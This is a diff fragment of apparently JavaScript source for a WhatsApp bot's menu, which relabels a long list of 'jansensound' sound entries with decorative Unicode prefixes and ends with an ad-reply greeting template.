-┃𖠀⃟❍➢jansensound70
-┃𖠀⃟❍➢jansensound71
-┃𖠀⃟❍➢jansensound72
-┃𖠀⃟❍➢jansensound73
-┃𖠀⃟❍➢jansensound74
-┃𖠀⃟❍➢jansensound75
-┃𖠀⃟❍➢jansensound76
-┃𖠀⃟❍➢jansensound77
-┃𖠀⃟❍➢jansensound78
-┃𖠀⃟❍➢jansensound79
-┃𖠀⃟❍➢jansensound80
-┃𖠀⃟❍➢jansensound81
-┃𖠀⃟❍➢jansensound82
-┃𖠀⃟❍➢jansensound83
-┃𖠀⃟❍➢jansensound84
-┃𖠀⃟❍➢jansensound85
-┃𖠀⃟❍➢jansensound86
-┃𖠀⃟❍➢jansensound87
-┃𖠀⃟❍➢jansensound88
-┃𖠀⃟❍➢jansensound89
-┃𖠀⃟❍➢jansensound90
-┃𖠀⃟❍➢jansensound91
-┃𖠀⃟❍➢jansensound92
-┃𖠀⃟❍➢jansensound93
-┃𖠀⃟❍➢jansensound94
-┃𖠀⃟❍➢jansensound95
-┃𖠀⃟❍➢jansensound96
-┃𖠀⃟❍➢jansensound97
-┃𖠀⃟❍➢jansensound98
-┃𖠀⃟❍➢jansensound99
-┃𖠀⃟❍➢jansensound100
-┃𖠀⃟❍➢jansensound101
-┃𖠀⃟❍➢jansensound102
-┃𖠀⃟❍➢jansensound103
-┃𖠀⃟❍➢jansensound104
-┃𖠀⃟❍➢jansensound105
-┃𖠀⃟❍➢jansensound106
-┃𖠀⃟❍➢jansensound107
-┃𖠀⃟❍➢jansensound108
-┃𖠀⃟❍➢jansensound109
-┃𖠀⃟❍➢jansensound110
-┃𖠀⃟❍➢jansensound111
-┃𖠀⃟❍➢jansensound112
-┃𖠀⃟❍➢jansensound113
-┃𖠀⃟❍➢jansensound114
-┃𖠀⃟❍➢jansensound115
-┃𖠀⃟❍➢jansensound116
-┃𖠀⃟❍➢jansensound117
-┃𖠀⃟❍➢jansensound118
-┃𖠀⃟❍➢jansensound119
-┃𖠀⃟❍➢jansensound120
-┃𖠀⃟❍➢jansensound121
-┃𖠀⃟❍➢jansensound122
-┃𖠀⃟❍➢jansensound123
-┃𖠀⃟❍➢jansensound124
-┃𖠀⃟❍➢jansensound125
-┃𖠀⃟❍➢jansensound126
-┃𖠀⃟❍➢jansensound127
-┃𖠀⃟❍➢jansensound128
-┃𖠀⃟❍➢jansensound129
-┃𖠀⃟❍➢jansensound130
-┃𖠀⃟❍➢jansensound131
-┃𖠀⃟❍➢jansensound132
-┃𖠀⃟❍➢jansensound133
-┃𖠀⃟❍➢jansensound134
-┃𖠀⃟❍➢jansensound135
-┃𖠀⃟❍➢jansensound136
-┃𖠀⃟❍➢jansensound137
-┃𖠀⃟❍➢jansensound138
-┃𖠀⃟❍➢jansensound139
-┃𖠀⃟❍➢jansensound140
-┃𖠀⃟❍➢jansensound141
-┃𖠀⃟❍➢jansensound142
-┃𖠀⃟❍➢jansensound143
-┃𖠀⃟❍➢jansensound144
-┃𖠀⃟❍➢jansensound145
-┃𖠀⃟❍➢jansensound146
-┃𖠀⃟❍➢jansensound147
-┃𖠀⃟❍➢jansensound148
-┃𖠀⃟❍➢jansensound149
-┃𖠀⃟❍➢jansensound150
-┃𖠀⃟❍➢jansensound151
-┃𖠀⃟❍➢jansensound152
-┃𖠀⃟❍➢jansensound153
-┃𖠀⃟❍➢jansensound154
-┃𖠀⃟❍➢jansensound155
-┃𖠀⃟❍➢jansensound156
-┃𖠀⃟❍➢jansensound157
-┃𖠀⃟❍➢jansensound158
-┃𖠀⃟❍➢jansensound159
-┃𖠀⃟❍➢jansensound160
-┃𖠀⃟❍➢jansensound161
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound1
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound2
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound3
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound4
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound5
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound6
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound7
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound8
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound9
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound10
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound11
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound12
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound13
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound14
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound15
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound16
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound17
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound18
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound19
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound20
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound21
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound22
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound23
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound24
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound25
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound26
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound27
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound28
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound29
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound30
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound31
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound32
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound33
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound34
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound35
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound36
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound37
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound38
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound39
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound40
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound41
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound42
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound43
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound44
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound45
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound46
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound47
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound48
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound49
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound50
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound51
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound52
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound53
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound54
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound55
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound56
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound57
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound58
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound59
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound60
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound61
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound62
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound63
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound64
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound65
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound66
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound67
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound68
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound69
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound70
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound71
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound72
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound73
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound74
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound75
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound76
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound77
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound78
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound79
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound80
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound81
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound82
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound83
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound84
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound85
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound86
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound87
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound88
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound89
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound90
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound91
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound92
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound93
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound94
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound95
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound96
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound97
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound98
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound99
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound100
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound101
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound102
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound103
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound104
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound105
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound106
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound107
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound108
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound109
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound110
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound111
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound112
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound113
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound114
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound115
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound116
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound117
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound118
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound119
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound120
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound121
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound122
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound123
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound124
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound125
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound126
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound127
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound128
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound129
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound130
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound131
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound132
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound133
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound134
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound135
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound136
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound137
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound138
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound139
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound140
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound141
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound142
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound143
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound144
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound145
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound146
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound147
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound148
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound149
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound150
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound151
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound152
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound153
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound154
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound155
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound156
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound157
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound158
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound159
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound160
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound161
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
